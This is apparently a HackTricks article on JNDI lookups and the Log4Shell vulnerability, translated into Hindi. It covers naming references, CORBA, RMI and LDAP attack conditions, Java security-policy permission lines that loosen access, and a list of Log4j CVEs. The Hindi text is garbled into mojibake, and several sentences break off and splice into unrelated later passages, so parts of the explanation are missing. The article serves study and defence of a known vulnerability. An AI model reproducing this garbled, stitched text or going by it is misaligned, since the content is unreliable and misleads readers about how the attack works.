# JNDI - рдЬрд╛рд╡рд╛ рдиреЗрдорд┐рдВрдЧ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ рдФрд░ Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред рдЗрдВрдЯреНрд░реВрдбрд░ рдЖрдкрдХреА рд╣рдорд▓рд╛ рд╕рддрд╣ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрдордХреА рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рдЯреЗрдХ рд╕реНрдЯреИрдХ, рдПрдкреАрдЖрдИ рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ, рдореБрджреНрджреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред [**рдЗрд╕реЗ рдореБрдлреНрдд рдореЗрдВ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) рдЖрдЬред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

JNDI рдЬрд╛рд╡рд╛ рдореЗрдВ 1990 рдХреЗ рджрд╢рдХ рд╕реЗ рдореМрдЬреВрдж рд╣реИред рдпрд╣ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдПрдХ рдирд╛рдо рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рд╡рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдбреЗрдЯрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдПрдХ рдирд╛рдо рд╕реЗрд╡рд╛ рдорд╛рдиреНрдпрддрд╛рдПрдВ (рдмрд╛рдЗрдВрдбрд┐рдВрдЧ) рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рд╕рдВрджрд░реНрдн рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

JNDI рдХреЗ рдкрд╛рд╕ рдХрдИ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕** (SPIs) рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддреЗ рд╣реИрдВред JNDI рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рд╣реИред рдЖрдк рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЖрдк рджреВрд░рд╕реНрде рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣реАрдВ рдкрд░ рдПрдХ рд╕рдорд╕реНрдпрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **CORBA COS** (рд╕рд╛рдорд╛рдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗрд╡рд╛), **рдЬрд╛рд╡рд╛ RMI** (рд░рд┐рдореЛрдЯ рдореЗрдердб рдЗрдВрдЯрд░рдлреЗрд╕) рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдФрд░ **LDAP** рдХреЗ рд▓рд┐рдП SPIs рдореМрдЬреВрдж рд╣реИрдВред

![](<../../.gitbook/assets/image (627).png>)

### JNDI рдирд╛рдо рд╕рдВрджрд░реНрдн

рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдмрд╛рдЗрдирд░реА рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдХреЛ рд╕рд╣реЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рд╢рд╛рдпрдж рдХреНрдпреЛрдВрдХрд┐ рдбреЗрдЯрд╛ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реИ рдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рдХрд╛рд░рдг рд╣реИ)ред\
рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, **рдирд╛рдо рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдпрд╣рд╛рдВ 2 рдкреНрд░рдХрд╛рд░ рдХреЗ рдирд╛рдо рд╕рдВрджрд░реНрдн рд╣реИрдВ:

* **рд╕рдВрджрд░реНрдн рдкрддреЗ**: рдЗрд╕рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (_rmi://server/ref_), рдлрд┐рд░ **рдСрдмреНрдЬреЗрдХреНрдЯ рдЙрд╕ рдкрддреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
* **рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА**: рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдПрдХ **рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА рдХрдХреНрд╖рд╛** рдХреЛ JNDI рд╕рдВрджрд░реНрдн рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдлрд┐рд░, JNDI рдкрддреЗ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рд░рд┐рдореЛрдЯ рдХрдХреНрд╖рд╛ рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА рд╕реЗ рд▓реА рдЬрд╛рдПрдЧреА рдФрд░ **рдХрдХреНрд╖рд╛ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рд▓реЛрдб** рдХреА рдЬрд╛рдПрдЧреАред

рдпрд╣ рдЦрддрд░рдирд╛рдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдЕрдирд┐рдпрдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд▓реЛрдб
### CORBA

рдПрдХ **Interoperable Object Reference (IOR)** CORBA рдпрд╛ RMI-IIOP рд╕рдВрджрд░реНрдн рд╣реИ рдЬреЛ рдПрдХ рджреВрд░рд╕реНрде CORBA рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЕрджреНрд╡рд┐рддреАрдпрддрд╛ рд╕реЗ рдкрд╣рдЪрд╛рдирддрд╛ рд╣реИред IORs рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рд░реВрдк рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЗрдХреНрд╕ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдмреАрдЪ, рдЗрд╕рдореЗрдВ **Type ID** (рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛) рдФрд░ **Codebase** (рд╕реНрдЯрдм рдХрдХреНрд╖рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рджреВрд░рд╕реНрде рд╕реНрдерд╛рди) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ CORBA рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред
рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

* рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**
* рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд **рдХреЛрдбрдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рджреНрд╡рд╛рд░рд╛ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП**ред рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ:
* рд╕реЙрдХреЗрдЯ рдЕрдиреБрдорддрд┐: `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* рд╕рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐: `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐ (рд╡рд░реНрдЧреЛрдВ рдпрд╛ рдЬрд╝рд┐рдк рдЖрд░реНрдХрд╛рдЗрд╡)

рдЖрдк **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЗрдВ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рдХреНрд░реЗрддрд╛рдУрдВ рдХреА рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдкрд╛рдПрдВрдЧреЗ**ред

### RMI

рдкрд┐рдЫрд▓реЗ **JNDI Naming Reference Section** рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ RMI рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдирд┐рд╢реНрдЪрд┐рдд рдЬрд╛рд╡рд╛ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдЧрд╛ред рдФрд░ рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдРрд╕рд╛ рд╣реЛрдЧрд╛ рднреА, рддреЛ рдЖрдкрдХреЛ **рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдмрдВрдзрдХ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рджреБрд░реНрдЧрдо рдХрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╣рдордиреЗ рдпрд╣ рд╕реАрдЦрд╛ рдерд╛ рдХрд┐ рдпрд╣ CORBA рдХреЗ рд╕рд╛рде рд╕рдВрднрд╡ рд╣реИ)ред

### LDAP

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдПрдХ рдЦреЛрдЬ рдФрд░ рдПрдХ рд▓реБрдХрдЕрдк рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
рдПрдХ **рдЦреЛрдЬ** рдПрдХ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧреА рдЬреИрд╕реЗ `ldap://localhost:389/o=JNDITutorial` рдЬрд┐рд╕рд╕реЗ LDAP рд╕рд░реНрд╡рд░ рд╕реЗ JNDITutorial рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
рдПрдХ **рд▓реБрдХрдЕрдк** рдиреЗрдорд┐рдВрдЧ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ **рдЬреЛ рднреА рдПрдХ рдирд╛рдо рд╕реЗ рдмрд╛рдВрдзрд╛ рд╣реБрдЖ рд╣реИ рдЙрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИ**ред

рдпрджрд┐ LDAP рдЦреЛрдЬ рдХреЛ **SearchControls.setReturningObjFlag() рдХреЗ рд╕рд╛рде `true` рдХреЗ рд╕рд╛рде рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреБрдирд░реНрдирд┐рд░реНрдорд┐рдд рд╣реЛрдЧрд╛**ред

рдЗрд╕рд▓рд┐рдП, рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред
рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рд▓рдбрд╝рд╛рдИ рд░рд┐рдХреЙрд░реНрдбреНрд╕ рдХреЛ рдЕрдкрдиреЗ рдмреАрдЪ рдореЗрдВ рдЬрд╣рд░ рдШреЛрд▓ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдЙрдирдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВрдЧреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдореЗрдВ (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ LDAP рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛)ред рдЗрд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ LDAP рдЦреЛрдЬ рдореЗрдВ **MitM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдП**ред

рдпрджрд┐ рдЖрдк **рдПрдХ рдРрдк рдХреЛ рдПрдХ JNDI LDAP URL рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрд╕ LDAP рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдЖрдк рд╡рд╛рдкрд╕ рд╣рдорд▓рд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ (log4shell)ред

#### рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╣рдорд▓рд╛

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**рд╣рдорд▓рд╛ рд╕реАрд░реАрдпрдХреГрдд рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рд╣реЛрдЧрд╛ред
рдпрджрд┐ `trustURLCodebase` `true` рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреА рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдХреЛрдбрдмреЗрд╕ рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЙрд╕реЗ рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВ рдЧ
\_\_"Log4j 2.16.0 рдиреЗ рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░ рджрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рдВрджреЗрд╢ рдЦреЛрдЬ рдкреИрдЯрд░реНрди рдХреЗ рд╕рдорд░реНрдерди рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ JNDI рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ," NVD рд╕рд▓рд╛рд╣рдХрд╛рд░ рдХрд╛ рдХрд╣рдирд╛ рд╣реИред 2.12.1 рд╢рд╛рдЦрд╛ рдкрд░ рд░рд╣рдиреЗ рд╡рд╛рд▓реЛрдВ рдХреЗ рд▓рд┐рдП, рдПрдХ рдареАрдХ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ 2.12.2 рдореЗрдВ рд╡рд╛рдкрд╕ рд▓рд╛рдИ рдЧрдИ рд╣реИред\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[рдЙрдЪреНрдЪ]**: рдХреНрдпрд╛ рд╣рдордиреЗ рдХрд╣рд╛ рдерд╛ рдХрд┐ Log4j 2.x рд╕рдВрд╕реНрдХрд░рдг рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИрдВ? рд▓реЗрдХрд┐рди **Log4j 1.x** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?\
\
рдкрд╣рд▓реЗ рд╕реЛрдЪрд╛ рдЬрд╛рддрд╛ рдерд╛ рдХрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди Log4Shell рдиреЗ рдкреБрд░рд╛рдиреЗ Log4j рдореЗрдВ рднреА рдЫрд┐рдкрдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝ рд▓рд┐рдпрд╛ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, **\_JMSAppender**\_\*\* рдХрдХреНрд╖ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Log4j 1.x рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рдХреЗ рдЧреИрд░-рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рднреА рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рджреЛрд╖ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ\*\*.\
\
рдпрджреНрдпрдкрд┐ CVE-2021-44228 рдХрд╛ рдПрдХ рдХрдо рдЧрдВрднреАрд░ рдкреНрд░рдХрд╛рд░ рд╣реИ, рдлрд┐рд░ рднреА, рдпрд╣ CVE [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) рдФрд░ [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) рдХреЗ рд╕рднреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ рдХреЗрд╡рд▓ 1.x рд░рд┐рд▓реАрдЬрд╝ рдореМрдЬреВрдж рд╣реИрдВред рдХреНрдпреЛрдВрдХрд┐ рдпреЗ [рдЕрдВрдд-рдЬреАрд╡рди](https://logging.apache.org/log4j/1.2/) рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВ, **1.x рд╢рд╛рдЦрд╛ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдареАрдХ рдирд╣реАрдВ рд╣реИ**, рдФрд░ рдЖрдкрдХреЛ _log4j-core_ 2.17.0 рдкрд░ рдЕрдкрдЧреНрд░реЗрдб рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред (рдЬрд╛рд╣рд┐рд░ рд╣реИ рдХрд┐ 1.0 рдкреНрд░рднрд╛рд╡рд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ)ред\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[рдордзреНрдпрдо]:** рдпрд╣ рдПрдХ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рд╣реИ **Logback рд▓реЙрдЧрд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ** рдореЗрдВред Log4j 1.x рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдПрдХ рдЙрддреНрддрд░рджрд╛рдпреА рдХреЗ рд░реВрдк рдореЗрдВ, Logback рджрд╛рд╡рд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ "log4j 1.x рдХреЗ рдЕрдВрдд рдХрд░рддрд╛ рд╣реИ"ред\
\
рдкрд┐рдЫрд▓реЗ рд╕рдкреНрддрд╛рд╣ рддрдХ, Logback рдиреЗ рднреА [рджрд╛рд╡рд╛](https://archive.md/QkzIy) рдХрд┐рдпрд╛ рдерд╛ рдХрд┐ рдпрд╣ "log4j 2.x рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИ, \[logback] рдЗрд╕рдХреЗ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛рдУрдВ рдХреЛ рд╕рд╛рдЭрд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ"ред\
\
